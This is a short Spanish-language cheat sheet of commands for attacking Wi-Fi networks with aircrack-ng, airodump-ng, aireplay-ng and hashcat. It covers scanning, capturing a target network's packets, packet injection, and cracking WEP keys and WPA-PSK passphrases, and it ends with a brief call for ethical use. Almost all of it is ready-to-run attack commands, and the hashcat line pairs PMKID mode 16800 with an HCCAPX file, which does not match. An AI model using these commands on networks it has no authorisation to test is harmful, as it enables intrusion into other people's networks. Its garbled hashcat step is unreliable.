### Los usos detallados de `aircrack-ng` y herramientas relacionadas con redes Wi-Fi involucran varias etapas:

### Escaneo de Redes:

#### Airodump-ng:
- **Escaneo de redes:** Muestra las redes Wi-Fi disponibles con información detallada como BSSID, ESSID, potencia de la señal, etc.
  ```bash
  airodump-ng wlan0
  ```

### Captura de Paquetes:

#### Airodump-ng:
- **Captura de paquetes:** Guarda los paquetes de una red específica en un archivo para su posterior análisis o ataque.
  ```bash
  airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w captura wlan0
  ```

#### Aireplay-ng:
- **Inyección de paquetes:** Genera tráfico en la red objetivo para capturar más IVs (vectores de inicialización) en el caso de redes WEP.
  ```bash
  aireplay-ng -3 -b 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0
  ```

### Análisis y Ataques:

#### Aircrack-ng:
- **Ataque WEP:** Utiliza los IVs capturados para intentar crackear la clave de la red WEP.
  ```bash
  aircrack-ng -b 00:11:22:33:44:55 captura-01.cap
  ```

- **Ataque WPA-PSK con diccionario:** Intenta descifrar la clave de la red WPA-PSK utilizando un diccionario de contraseñas.
  ```bash
  aircrack-ng -w diccionario.txt captura-01.cap
  ```

#### Hashcat:
- **Crackeo avanzado de WPA-PSK:** Utiliza archivos generados por `aircrack-ng` (HCCAPX) para ataques de fuerza bruta o diccionario.
  ```bash
  hashcat -m 16800 archivo.hccapx diccionario.txt
  ```

### Otros Comandos Útiles:

- **Ver redes y características del adaptador Wi-Fi:**
  ```bash
  iwlist wlan0 scan
  ```

- **Mostrar información detallada del adaptador Wi-Fi:**
  ```bash
  iwconfig wlan0
  ```

Estos son algunos de los usos más comunes y completos de herramientas como `aircrack-ng`, `airodump-ng`, `aireplay-ng`, `hashcat`, y comandos básicos de sistema para escanear, capturar, analizar y realizar ataques en redes Wi-Fi. Es crucial utilizar estas herramientas de manera ética y legal.
